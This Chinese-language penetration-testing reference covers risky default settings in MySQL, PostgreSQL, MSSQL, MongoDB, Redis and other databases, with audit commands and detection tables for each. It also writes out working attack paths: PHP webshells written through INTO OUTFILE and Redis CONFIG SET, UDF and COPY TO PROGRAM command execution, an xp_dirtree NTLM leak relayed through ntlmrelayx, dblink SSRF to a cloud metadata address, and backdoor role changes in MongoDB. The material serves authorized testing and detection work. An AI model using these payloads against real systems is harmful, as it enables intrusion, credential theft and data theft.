# 数据库配置错误清单：五类库的危险默认项与一条命令查完

> 被 `database-security` 引用。目标不是"有没有弱口令"，而是**这台库把什么能力暴露给了
> 谁**：监听地址、认证方式、可写目录、扩展加载、文件读写权限。

## 一、通用第一步：先确定"谁在听、谁在连"

```bash
# 端口 + 进程 + 监听地址（Linux）
ss -tlnp | grep -E ':(3306|5432|1433|27017|6379|11211|9200|9042|1521)\b'
# 输出里 0.0.0.0:3306 = 监听所有网卡；127.0.0.1 = 仅本机
```

```powershell
# Windows
Get-NetTCPConnection -State Listen | Where-Object {$_.LocalPort -in 3306,5432,1433,27017,6379} |
  Select-Object LocalAddress,LocalPort,OwningProcess
```

```bash
# 从外部看是否可达（授权范围内）
nmap -Pn -p 3306,5432,1433,27017,6379,9200 -sV --script=banner 10.0.0.20
```

## 二、MySQL / MariaDB

### 2.1 危险默认项

| 项 | 危险值 | 后果 |
| --- | --- | --- |
| `bind-address` | `0.0.0.0` 或空 | 全网可达 |
| `skip-grant-tables` | 开启 | **任意登录无需密码** |
| `local_infile` | `ON`（MySQL 8 默认 OFF） | 客户端可 `LOAD DATA LOCAL INFILE` 读**客户端**文件 |
| `secure_file_priv` | 空字符串 | `INTO OUTFILE` 可写任意目录 → 写 webshell |
| `plugin_dir` + `INSTALL PLUGIN` | root 可装 | 加载恶意 UDF → 命令执行 |
| `general_log` | ON 且 `log_output=TABLE` | 日志表可读，含明文密码 |
| 空口令 root | `root@%` 无密码 | 直接接管 |
| `%` 通配 host | `'app'@'%'` | 任何来源可连 |

### 2.2 一条命令查完

```bash
mysql -h 10.0.0.20 -u root -p'PASS' -e "
SELECT @@version, @@version_compile_os, @@hostname, @@datadir, @@secure_file_priv,
       @@local_infile, @@skip_name_resolve, @@general_log, @@log_output, @@plugin_dir;
SELECT user,host,plugin,authentication_string='' AS empty_pw FROM mysql.user;
SHOW VARIABLES LIKE '%ssl%';
"
```

```bash
# 无凭证探测（授权范围内，判断是否匿名/空口令）
mysql -h 10.0.0.20 -u root --password= -e 'select 1' 2>&1 | head -3
mysql -h 10.0.0.20 -u root -e 'select 1' 2>&1 | head -3
```

### 2.3 高危利用路径

```bash
# ① secure_file_priv 为空 → 写文件
mysql -h 10.0.0.20 -u root -p'PASS' -e "
SELECT '<?php system(\$_GET[0]); ?>' INTO OUTFILE '/var/www/html/x.php';
"
curl -s 'http://10.0.0.20/x.php?0=id'

# ② UDF 提权（需要写 plugin_dir 的权限）
#    先用 INTO DUMPFILE 写 .so 到 plugin_dir，再 CREATE FUNCTION
#    顺序：写 so -> CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so' -> SELECT sys_exec('id')

# ③ 读文件（local_infile）
mysql -h 10.0.0.20 -u root -p'PASS' --local-infile=1 -e "
CREATE TABLE t(l TEXT); LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE t;
SELECT * FROM t;"
```

**验伤**：`INTO OUTFILE` 成功返回 `Query OK, 1 row affected`，并且 `curl` 能访问到那个文件；
UDF 成功是 `SELECT sys_exec('id')` 返回 0 且真的执行了（用回连或写文件验证）。

### 2.4 检测视角

| 手法 | 日志 | 信号 |
| --- | --- | --- |
| 空口令/弱口令 | MySQL 错误日志 | 大量 `Access denied for user 'root'@'x.x.x.x'` 来自同一 IP |
| `INTO OUTFILE` | general log（若开） | `SELECT ... INTO OUTFILE`；写入路径在 web 根目录 |
| UDF 加载 | 审计插件 / EDR | `CREATE FUNCTION ... SONAME`；plugin_dir 出现新 `.so` |
| `LOAD DATA LOCAL` | general log | `LOAD DATA LOCAL INFILE` 指向 `/etc/` 或用户目录 |
| 全表拖库 | 慢查询/审计 | 单会话 `SELECT` 行数远超基线；`information_schema` 高频查询 |

## 三、PostgreSQL

### 3.1 危险默认项

| 项 | 危险值 | 后果 |
| --- | --- | --- |
| `listen_addresses` | `'*'` | 全网可达 |
| `pg_hba.conf` | `host all all 0.0.0.0/0 trust` 或 `md5` 弱 | 任意登录 / 明文口令 |
| `superuser` 可远程 | `postgres` 有远程口令 | 直接 `COPY ... TO PROGRAM` 命令执行 |
| `log_statement` | `'all'` 且日志可读 | 明文语句泄露 |
| 扩展可装 | `plpython3u` / `dblink` / `postgres_fdw` | SSRF / 命令执行 |
| `pg_read_server_files` 角色 | 授予普通用户 | 读服务器任意文件 |

### 3.2 一条命令查完

```bash
psql "host=10.0.0.20 port=5432 user=postgres password=PASS dbname=postgres" -c "
SELECT version();
SHOW listen_addresses; SHOW ssl; SHOW data_directory;
SELECT * FROM pg_settings WHERE name IN ('log_statement','password_encryption','ssl');
"
# pg_hba 内容（需超级用户）
psql "host=10.0.0.20 user=postgres password=PASS" -Atc "SELECT * FROM pg_hba_file_rules;" 
```

```bash
# 无凭证探测
psql "host=10.0.0.20 user=postgres dbname=postgres" -c 'select 1' 2>&1 | head -3
# "no password supplied" / "password authentication failed" 说明可达且在认证
```

### 3.3 高危利用路径

```bash
# ① COPY TO PROGRAM（超级用户 → 命令执行），Postgres 10+
psql "host=10.0.0.20 user=postgres password=PASS" -c "
COPY (SELECT '') TO PROGRAM 'id > /tmp/pwned';"
psql "host=10.0.0.20 user=postgres password=PASS" -c "COPY t FROM PROGRAM 'cat /tmp/pwned';"

# ② 读服务器文件
psql "..." -c "CREATE TABLE f(l text); COPY f FROM '/etc/passwd'; SELECT * FROM f LIMIT 3;"

# ③ plpython3u（若装了）
psql "..." -c "CREATE EXTENSION plpython3u;
CREATE FUNCTION f() RETURNS text AS \$\$ import os; return os.popen('id').read() \$\$ LANGUAGE plpython3u;
SELECT f();"

# ④ dblink SSRF
psql "..." -c "CREATE EXTENSION dblink;
SELECT * FROM dblink('host=169.254.169.254 port=80 dbname=x user=x','select 1') AS t(a int);"
```

**验伤**：`COPY TO PROGRAM` 返回 `COPY 1` 且 `/tmp/pwned` 有内容；`COPY FROM PROGRAM` 能读回 stdout。

### 3.4 检测视角

| 手法 | 日志 | 信号 |
| --- | --- | --- |
| `COPY ... PROGRAM` | `log_statement=all` 时的 pg 日志 | 语句含 `COPY ... TO/FROM PROGRAM` |
| 读文件 | pg 日志 | `COPY ... FROM '/etc/'`；`pg_read_file(` |
| 扩展加载 | pg 日志 | `CREATE EXTENSION plpython3u` / `dblink` |
| 暴力破解 | `pg_log` | `password authentication failed for user` 高频 |

## 四、MSSQL

### 4.1 危险默认项

| 项 | 危险值 | 后果 |
| --- | --- | --- |
| `sa` 弱口令 / 空口令 | — | 直接 sysadmin |
| `xp_cmdshell` | 开启 | 命令执行 |
| `Ole Automation Procedures` | 开启 | COM 对象调用 |
| `xp_dirtree` 可达 | 默认可用 | **SMB 出网 → NTLM 泄露 → 中继** |
| 混合认证 | `Mixed Mode` | 可爆破 SQL 账号 |
| `CLR integration` | 开启 | 加载恶意程序集 → 命令执行 |
| 端口 1433 公网 | — | 直接暴露 |

### 4.2 一条命令查完

```bash
# 用 impacket 免装 sqlcmd
impacket-mssqlclient 'sa:PASS@10.0.0.20' -windows-auth 2>/dev/null || \
impacket-mssqlclient 'sa:PASS@10.0.0.20'
```

```sql
-- 进去后一次查完
SELECT @@VERSION, SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin') AS is_sa;
SELECT name, value_in_use FROM sys.configurations
 WHERE name IN ('xp_cmdshell','Ole Automation Procedures','clr enabled','Ad Hoc Distributed Queries');
SELECT SERVERPROPERTY('IsIntegratedSecurityOnly') AS windows_only;
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
```

```bash
# 单条命令（sqlcmd）
sqlcmd -S 10.0.0.20 -U sa -P 'PASS' -Q "SELECT @@VERSION; SELECT IS_SRVROLEMEMBER('sysadmin');" -C
```

### 4.3 高危利用路径

```bash
# ① xp_cmdshell
sqlcmd -S 10.0.0.20 -U sa -P 'PASS' -C -Q "
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'whoami /all';"

# ② xp_dirtree 触发 NTLM 出网（配合 Responder/ntlmrelayx）
sqlcmd -S 10.0.0.20 -U sa -P 'PASS' -C -Q "EXEC xp_dirtree '\\10.0.0.99\share',1,1;"
# 10.0.0.99 上开：impacket-ntlmrelayx -t ldap://dc --delegate-access -smb2support

# ③ OPENROWSET 读文件 / SSRF
sqlcmd -S 10.0.0.20 -U sa -P 'PASS' -C -Q "
SELECT * FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) AS x;"
```

**验伤**：`xp_cmdshell` 返回结果集（列名 `output`）；`xp_dirtree` 在 Responder 侧看到
`NTLMSSP` 的 `User`/`Host` 字段（这是最硬的证据）。

### 4.4 检测视角

| 手法 | 日志 | 信号 |
| --- | --- | --- |
| `xp_cmdshell` | SQL Server Error Log + 4624 | `sp_configure 'xp_cmdshell'` 变更；子进程 `cmd.exe` 父进程是 `sqlservr.exe` |
| `xp_dirtree` NTLM | 防火墙/IDS | SQL 主机向非文件服务器发起 SMB（445）连接 |
| 爆破 | 18456 | 大量登录失败，`State` 字段区分原因 |
| 提权 | 4624/4672 | SQL 服务账户获得 SeDebugPrivilege 等特权 |

## 五、MongoDB

### 5.1 危险默认项

| 项 | 危险值 | 后果 |
| --- | --- | --- |
| `bindIp` | `0.0.0.0` | 全网可达 |
| 未开 `security.authorization` | 默认无认证（4.x 前的默认，很多部署沿用） | **任意读写** |
| 弱口令 admin | — | 全库接管 |
| `enableLocalhostAuthBypass` | 默认 true（3.6 前的隐患） | 本机连接免认证 |

### 5.2 一条命令查完

```bash
# 无认证探测（不需要任何凭证）
mongosh --host 10.0.0.20 --port 27017 --quiet --eval '
db.adminCommand({getCmdLineOpts:1}).parsed
' 2>&1 | head -40
```

```bash
# 一条命令列库 + 计数 + 取样
mongosh "mongodb://10.0.0.20:27017" --quiet --eval '
db.adminCommand({listDatabases:1}).databases.forEach(d=>{
  const c=db.getSiblingDB(d.name).getCollectionNames();
  print(d.name+" -> "+c.join(","));
});'
```

```bash
# 带认证
mongosh "mongodb://admin:PASS@10.0.0.20:27017/?authSource=admin" --quiet --eval 'db.runCommand({connectionStatus:1})'
```

### 5.3 高危利用路径

```bash
# ① 无认证直接读用户集合
mongosh "mongodb://10.0.0.20:27017/app" --quiet --eval '
printjson(db.users.find({},{username:1,password:1,role:1}).limit(5).toArray())'

# ② 写数据（改管理员密码/插后门用户）
mongosh "mongodb://10.0.0.20:27017/app" --quiet --eval '
db.users.updateOne({username:"admin"},{$set:{role:"superadmin"}})'

# ③ 导全库（授权范围内）
mongodump --uri "mongodb://admin:PASS@10.0.0.20:27017" --out ./dump
```

**验伤**：能读到 `users` 集合里的真实记录（含 hash），或者写入后能读回。

### 5.4 检测视角

| 手法 | 日志 | 信号 |
| --- | --- | --- |
| 匿名访问 | mongod 日志 | `Authentication` 未出现但收到查询；`connection accepted` 后紧跟 `find` |
| 全库 dump | 慢查询/profiler | `listDatabases`、大量 `find` 跨多个 db |
| 写后门 | 应用审计 | `users` 集合的 `role` 字段变更 |
| 爆破 | mongod 日志 | `Authentication failed` 高频 |

## 六、Redis

### 6.1 危险默认项

| 项 | 危险值 | 后果 |
| --- | --- | --- |
| `bind` | `0.0.0.0` 或注释掉 | 全网可达 |
| `protected-mode` | `no` | 无密码也可远程 |
| `requirepass` | 空 | 任意命令 |
| `rename-command` 未做 | `CONFIG`/`MODULE` 可用 | 写文件 / 加载模块 |
| 以 root 运行 | — | 写 crontab / authorized_keys / webshell |
| `dir` 可写且 web 可访问 | — | RCE |

### 6.2 一条命令查完

```bash
redis-cli -h 10.0.0.20 -p 6379 INFO server 2>&1 | head -20
redis-cli -h 10.0.0.20 -p 6379 CONFIG GET '*' 2>&1 | head -40
redis-cli -h 10.0.0.20 -p 6379 INFO keyspace
```

```bash
# 无密码探测（NOAUTH 说明有密码；直接返回 PONG 说明无密码）
redis-cli -h 10.0.0.20 -p 6379 PING
# PONG → 无认证
# NOAUTH Authentication required → 有密码
```

### 6.3 高危利用路径

```bash
# ① 写文件（webshell / crontab / authorized_keys）
redis-cli -h 10.0.0.20 -p 6379 CONFIG SET dir /var/www/html
redis-cli -h 10.0.0.20 -p 6379 CONFIG SET dbfilename shell.php
redis-cli -h 10.0.0.20 -p 6379 SET payload '<?php system($_GET[0]); ?>'
redis-cli -h 10.0.0.20 -p 6379 SAVE

# ② master-slave 复制 RCE（redis-rogue-server / redis-ssrf）
#    在自己机器上起恶意 master，让目标 REPLICAOF 过来加载 module

# ③ 主从 + 模块加载（MODULE LOAD 需要 module 支持）
redis-cli -h 10.0.0.20 -p 6379 CONFIG SET dir /tmp
redis-cli -h 10.0.0.20 -p 6379 MODULE LOAD /tmp/exp.so

# ④ 数据窃取
redis-cli -h 10.0.0.20 -p 6379 --scan --pattern '*' | head -20
redis-cli -h 10.0.0.20 -p 6379 GET 'session:*' 
```

**验伤**：写的 webshell 能被 `curl` 请求并回显命令输出；`CONFIG SET dir` 返回 `OK` 且
`SAVE` 后文件真的出现在目标路径。

### 6.4 检测视角

| 手法 | 日志 | 信号 |
| --- | --- | --- |
| 无认证访问 | redis 日志 | 未认证连接执行 `CONFIG`/`SET` |
| 写文件 | EDR/文件审计 | web 根目录出现 `.php`/`.jsp`，且内容含 `<?php` |
| 主从复制 | 网络 | 目标 redis 向外部 6379 发起 `REPLCONF`/`PSYNC` |
| 模块加载 | EDR | redis 进程 `dlopen` 非标准路径的 `.so` |
| crontab 写入 | auditd | `/var/spool/cron/` 新增条目 |

## 七、其他必须顺手看的

| 库 | 单条命令 | 危险点 |
| --- | --- | --- |
| Elasticsearch | `curl -s 10.0.0.20:9200/_cat/indices?v` | 9200 公网、无认证、`_search` 全量拖 |
| Memcached | `echo -e 'stats\r' \| nc 10.0.0.20 11211` | UDP 11211 反射放大、无认证 |
| Cassandra | `cqlsh 10.0.0.20 -u cassandra -p cassandra` | 默认口令、9042 公网 |
| Oracle | `sqlplus scott/tiger@10.0.0.20:1521/ORCL` | 默认账号、1521 公网 |

## 八、验伤：配置错误的"成功"标准

| 结论 | 必须给 | 假象 |
| --- | --- | --- |
| 未授权访问 | 真实数据（表名 + 若干行） | 只连上返回 banner（说明可达但不代表能读） |
| 文件写出 | 文件路径 + `curl` 回显 | `INTO OUTFILE` 报 `secure_file_priv` 错误（那是被限制了） |
| 命令执行 | 命令 stdout / 出网回连 | UDF 加载成功但 `sys_exec` 返回 NULL（没执行） |
| NTLM 泄露 | Responder 侧的 `NTLMSSP` 包 | 只看到 SMB 连接尝试（可能被拒） |
| Redis 写 webshell | HTTP 200 + 命令输出 | 文件写了但 web 目录不可访问（路径错） |

**反例重点**：很多扫描器把 `CONFIG GET` 返回 `OK` 当"可写"，但真正的写需要
`dir` + `dbfilename` + `SAVE` 三步，且目标目录要有写权限。

## 九、常见坑

1. **端口开着不等于能用**——`nmap` 看到 3306 open 但可能只允许特定网段，用实际连接测。
2. **MySQL 8 默认 `local_infile=OFF` 且 `secure_file_priv` 有值**——别按老教程直接打 `INTO OUTFILE`。
3. **Postgres `COPY TO PROGRAM` 需要超级用户**——普通用户要先找提权（`pg_read_server_files` 角色、可写的函数）。
4. **MSSQL `xp_cmdshell` 默认关，但 `xp_dirtree` 默认开**——后者才是无门槛的出网路径。
5. **Redis `CONFIG SET` 在 6.2+ 需要 `enable-protected-configs`**——直接 SET 会报错，要先确认版本。
6. **写文件路径要有写权限**——`dir` 指向 `/var/www/html` 但 redis 以 `redis` 用户跑，目录不可写就失败。先 `CONFIG GET dir` 看默认值（通常 `/var/lib/redis` 可写）。
7. **别在生产做全量 dump**——`mongodump`/`mysqldump` 全库会明显影响性能，可能触发告警。先取单表两三行证明可读。